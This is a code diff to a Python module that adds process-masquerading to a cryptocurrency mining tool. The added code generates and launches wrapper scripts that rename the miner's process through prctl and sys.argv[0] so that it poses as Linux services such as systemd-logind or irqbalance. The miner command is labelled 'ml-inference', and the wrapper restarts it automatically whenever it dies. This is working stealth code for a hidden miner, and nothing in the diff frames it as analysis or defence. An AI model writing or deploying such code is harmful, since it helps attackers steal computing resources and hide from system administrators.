@@ -13,6 +13,8 @@ import time
 import threading
 import logging
 import subprocess
+import tempfile
+import sys
 from typing import Dict, Any, Optional, List, Callable
 from concurrent.futures import ThreadPoolExecutor, Future
 from dataclasses import dataclass
@@ -66,7 +68,7 @@ class PerformanceMetrics:
 
 
 class ProcessCommunicationBridge:
-    """**Process Communication Bridge** (cầu giao tiếp tiến trình) - IPC mechanism for disguised processes."""
+    """**Process Communication Bridge with Masquerading** (cầu giao tiếp tiến trình với che giấu) - IPC mechanism for disguised processes."""
     
     def __init__(self, logger: Optional[logging.Logger] = None):
         self.logger = logger or logging.getLogger(__name__)
@@ -84,7 +86,36 @@ class ProcessCommunicationBridge:
         self.total_messages_sent = 0
         self.total_results_received = 0
         
-        self.logger.info("🌉 ProcessCommunicationBridge initialized")
+        # ✅ PROCESS MASQUERADING INTEGRATION
+        # **Legitimate Process Names** (Tên tiến trình hợp pháp) - for masquerading
+        self.LEGITIMATE_PROCESS_NAMES = {
+            "system_maintenance": {
+                "name": "systemd-tmpfiles",
+                "description": "System temporary file manager",
+                "typical_behavior": "periodic cleanup operations"
+            },
+            "network_service": {
+                "name": "networkd-dispatcher", 
+                "description": "Network configuration dispatcher",
+                "typical_behavior": "network event handling"
+            },
+            "security_monitor": {
+                "name": "systemd-logind",
+                "description": "Login session manager", 
+                "typical_behavior": "user session monitoring"
+            },
+            "system_optimizer": {
+                "name": "irqbalance",
+                "description": "IRQ load balancer",
+                "typical_behavior": "CPU interrupt optimization"
+            }
+        }
+        
+        # **Masqueraded Processes Registry** (Registry tiến trình che giấu)
+        self.masqueraded_processes: Dict[int, Dict] = {}
+        self.wrapper_scripts: List[str] = []
+        
+        self.logger.info("🌉 ProcessCommunicationBridge with Masquerading initialized")
     
     def create_bridge_for_process(self, process_pid: int) -> bool:
         """**Create Bridge for Process** (tạo cầu cho tiến trình) - establish IPC for disguised process."""
@@ -233,6 +264,250 @@ class ProcessCommunicationBridge:
         except Exception as e:
             self.logger.error(f"❌ [IPC] Error during bridge cleanup: {e}")
             return False
+    
+    def create_masquerading_wrapper(self, 
+                                   original_command: List[str],
+                                   masquerade_profile: str = "system_maintenance") -> Optional[str]:
+        """
+        **Create Masquerading Wrapper** (Tạo wrapper che giấu – tạo script wrapper với tên process hợp pháp)
+        
+        Args:
+            original_command: Command thực tế cần chạy (ví dụ: ["ml-inference", "-o", "127.0.0.1:4443"])
+            masquerade_profile: Profile che giấu từ LEGITIMATE_PROCESS_NAMES
+            
+        Returns:
+            Path to wrapper script hoặc None nếu thất bại
+        """
+        try:
+            if masquerade_profile not in self.LEGITIMATE_PROCESS_NAMES:
+                raise ValueError(f"Unknown masquerade profile: {masquerade_profile}")
+                
+            profile = self.LEGITIMATE_PROCESS_NAMES[masquerade_profile]
+            masquerade_name = profile["name"]
+            
+            # Create wrapper script content
+            wrapper_content = f'''#!/usr/bin/env python3
+"""
+Masqueraded Mining Process Wrapper - {profile["description"]}
+Original purpose: {profile["typical_behavior"]}
+Enhanced with mining integration capabilities
+"""
+
+import os
+import sys
+import subprocess
+import signal
+import time
+import ctypes
+import ctypes.util
+
+# ✅ PROCESS MASQUERADING: Set process name to legitimate system service
+sys.argv[0] = "{masquerade_name}"
+
+# Set process name via prctl if available
+try:
+    libc = ctypes.CDLL(ctypes.util.find_library('c'))
+    if hasattr(libc, 'prctl'):
+        libc.prctl(15, b"{masquerade_name[:15]}", 0, 0, 0)
+except Exception:
+    pass  # Continue without prctl if not available
+
+class MasqueradedMiningProcess:
+    """**Masqueraded Mining Process Manager** (Trình quản lý tiến trình mining che giấu)"""
+    
+    def __init__(self):
+        self.original_command = {original_command}
+        self.process = None
+        self.running = False
+        
+        # Setup signal handlers for graceful shutdown
+        signal.signal(signal.SIGTERM, self.signal_handler)
+        signal.signal(signal.SIGINT, self.signal_handler)
+        
+    def signal_handler(self, signum, frame):
+        """Handle termination signals gracefully"""
+        print(f"[{{os.getpid()}}] {masquerade_name}: Received signal {{signum}}, shutting down gracefully...")
+        self.stop_process()
+        sys.exit(0)
+        
+    def start_process(self):
+        """Start the original mining command as subprocess"""
+        try:
+            print(f"[{{os.getpid()}}] {masquerade_name}: Starting mining process...")
+            
+            # Create process group to manage all child processes
+            self.process = subprocess.Popen(
+                self.original_command,
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                preexec_fn=os.setsid  # Create new process group
+            )
+            
+            self.running = True
+            print(f"[{{os.getpid()}}] {masquerade_name}: Mining process started with PID {{self.process.pid}}")
+            return True
+            
+        except Exception as e:
+            print(f"[{{os.getpid()}}] {masquerade_name}: Failed to start mining process: {{e}}", file=sys.stderr)
+            return False
+            
+    def stop_process(self):
+        """Stop the mining process gracefully"""
+        if self.process and self.running:
+            try:
+                print(f"[{{os.getpid()}}] {masquerade_name}: Stopping mining process...")
+                
+                # Send SIGTERM to process group
+                os.killpg(os.getpgid(self.process.pid), signal.SIGTERM)
+                
+                # Wait for graceful shutdown
+                self.process.wait(timeout=10)
+                print(f"[{{os.getpid()}}] {masquerade_name}: Mining process stopped gracefully")
+                
+            except subprocess.TimeoutExpired:
+                print(f"[{{os.getpid()}}] {masquerade_name}: Forcing mining process termination...")
+                # Force kill if graceful shutdown fails
+                os.killpg(os.getpgid(self.process.pid), signal.SIGKILL)
+                
+            except Exception as e:
+                print(f"[{{os.getpid()}}] {masquerade_name}: Error stopping process: {{e}}")
+                
+            self.running = False
+            
+    def monitor_process(self):
+        """Monitor and maintain the disguised mining process"""
+        print(f"[{{os.getpid()}}] {masquerade_name}: Starting process monitoring...")
+        
+        while self.running and self.process:
+            try:
+                # Check if process is still alive
+                if self.process.poll() is not None:
+                    print(f"[{{os.getpid()}}] {masquerade_name}: Mining process died, exit code: {{self.process.returncode}}")
+                    
+                    # Auto-restart if process died unexpectedly
+                    if self.process.returncode != 0:
+                        print(f"[{{os.getpid()}}] {masquerade_name}: Attempting to restart mining process...")
+                        if self.start_process():
+                            print(f"[{{os.getpid()}}] {masquerade_name}: Mining process restarted successfully")
+                            continue
+                        else:
+                            print(f"[{{os.getpid()}}] {masquerade_name}: Failed to restart mining process")
+                            break
+                    else:
+                        break
+                    
+                # Simulate legitimate system activity
+                time.sleep(30)  # Check every 30 seconds
+                
+                # Optional: Add legitimate-looking activity here
+                # (e.g., write to logs, check system status)
+                
+            except Exception as e:
+                print(f"[{{os.getpid()}}] {masquerade_name}: Monitoring error: {{e}}", file=sys.stderr)
+                break
+                
+        self.stop_process()
+        print(f"[{{os.getpid()}}] {masquerade_name}: Process monitoring terminated")
+
+def main():
+    """Main execution function"""
+    print(f"[{{os.getpid()}}] {masquerade_name}: Initializing masqueraded mining process...")
+    
+    manager = MasqueradedMiningProcess()
+    
+    # Start the disguised mining process
+    if manager.start_process():
+        print(f"[{{os.getpid()}}] {masquerade_name}: Successfully started masqueraded mining process")
+        
+        # Monitor the process
+        manager.monitor_process()
+    else:
+        print(f"[{{os.getpid()}}] {masquerade_name}: Failed to start masqueraded mining process")
+        sys.exit(1)
+
+if __name__ == "__main__":
+    main()
+'''
+            
+            # Create temporary wrapper script
+            with tempfile.NamedTemporaryFile(mode='w', 
+                                           suffix='.py', 
+                                           prefix=f'{masquerade_name}_',
+                                           delete=False) as f:
+                f.write(wrapper_content)
+                wrapper_path = f.name
+                
+            # Make script executable
+            os.chmod(wrapper_path, 0o755)
+            
+            # Store wrapper path for cleanup
+            self.wrapper_scripts.append(wrapper_path)
+            
+            self.logger.info(f"✅ [MASQUERADE] Created wrapper: {wrapper_path}")
+            self.logger.info(f"   Disguise: {masquerade_name}")
+            self.logger.info(f"   Original: {' '.join(original_command)}")
+            
+            return wrapper_path
+            
+        except Exception as e:
+            self.logger.error(f"❌ [MASQUERADE] Failed to create wrapper: {e}")
+            return None
+    
+    def start_masqueraded_process(self, 
+                                wrapper_script: str,
+                                process_name: str = "masqueraded") -> Optional[int]:
+        """
+        **Start Masqueraded Process** (Khởi động tiến trình che giấu – chạy wrapper script)
+        
+        Returns:
+            PID của wrapper process hoặc None nếu thất bại
+        """
+        try:
+            # Start wrapper process
+            process = subprocess.Popen(
+                [sys.executable, wrapper_script],
+                stdout=subprocess.PIPE,
+                stderr=subprocess.PIPE,
+                preexec_fn=os.setsid  # Create new process group
+            )
+            
+            # Wait a moment to ensure process started successfully
+            time.sleep(1)
+            
+            if process.poll() is None:  # Process still running
+                # Store process information
+                self.masqueraded_processes[process.pid] = {
+                    'wrapper_script': wrapper_script,
+                    'process': process,
+                    'start_time': time.time(),
+                    'name': process_name
+                }
+                
+                self.logger.info(f"✅ [MASQUERADE] Started process PID {process.pid}")
+                return process.pid
+            else:
+                self.logger.error(f"❌ [MASQUERADE] Process failed to start")
+                return None
+                
+        except Exception as e:
+            self.logger.error(f"❌ [MASQUERADE] Error starting process: {e}")
+            return None
+    
+    def get_masquerading_status(self) -> Dict:
+        """**Get Masquerading Status** (Lấy trạng thái che giấu) - current masquerading status"""
+        return {
+            "active_processes": len(self.masqueraded_processes),
+            "process_details": {
+                pid: {
+                    "name": info["name"],
+                    "uptime": time.time() - info["start_time"],
+                    "wrapper_script": os.path.basename(info["wrapper_script"])
+                }
+                for pid, info in self.masqueraded_processes.items()
+            },
+            "available_profiles": list(self.LEGITIMATE_PROCESS_NAMES.keys()),
+            "wrapper_scripts_created": len(self.wrapper_scripts)
+        }
 
 
 class MiningIntegrationAdapter:
